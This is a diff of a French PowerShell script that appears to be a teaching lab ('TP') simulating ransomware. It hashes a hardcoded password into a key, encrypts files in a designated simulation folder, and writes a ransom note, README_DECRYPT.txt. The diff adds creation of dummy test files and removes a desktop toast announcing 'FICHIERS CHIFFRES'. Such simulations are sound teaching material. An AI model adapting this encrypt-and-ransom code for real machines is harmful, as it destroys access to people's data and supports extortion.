@@ -1,6 +1,15 @@
 $password = "TP2026"
 $folder = "D:\Desktop\tp-simulation"
 
+if (-not (Test-Path $folder)) {
+    $folder = "C:\tp-simulation"
+    New-Item -ItemType Directory -Path $folder | Out-Null
+    "Contenu fichier texte" | Out-File "$folder\fichier_test.txt" -Encoding UTF8
+    "Contenu fichier pdf simulé" | Out-File "$folder\fichier_test.pdf" -Encoding UTF8
+    "Contenu fichier excel simulé" | Out-File "$folder\fichier_test.xlsx" -Encoding UTF8
+    Write-Host "Dossier et fichiers crees : $folder" -ForegroundColor Green
+}
+
 $sha = New-Object System.Security.Cryptography.SHA256Managed
 $key = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($password))
 
@@ -43,27 +52,6 @@ $utf8Bom = New-Object System.Text.UTF8Encoding $true
 [System.IO.File]::WriteAllText("$folder\README_DECRYPT.txt", $ransom, $utf8Bom)
 Write-Host "Note de rancon creee : README_DECRYPT.txt"
 
-# --- NOTIFICATION TOAST ---
-# --- NOTIFICATION TOAST ---
-[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null
-[Windows.Data.Xml.Dom.XmlDocument, Windows.Data.Xml.Dom.XmlDocument, ContentType = WindowsRuntime] | Out-Null
-
-$toastXml = @"
-<toast>
-  <visual>
-    <binding template="ToastText02">
-      <text id="1">FICHIERS CHIFFRES</text>
-      <text id="2">Vos fichiers ont ete chiffres. Lisez README_DECRYPT.txt</text>
-    </binding>
-  </visual>
-</toast>
-"@
-
-$xml = [Windows.Data.Xml.Dom.XmlDocument]::new()
-$xml.LoadXml($toastXml)
-
-$toast = [Windows.UI.Notifications.ToastNotification]::new($xml)
-[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\WindowsPowerShell\v1.0\powershell.exe").Show($toast)
 
 Write-Host ""
 Write-Host "Tous les fichiers sont chiffres. Consulter README_DECRYPT.txt"
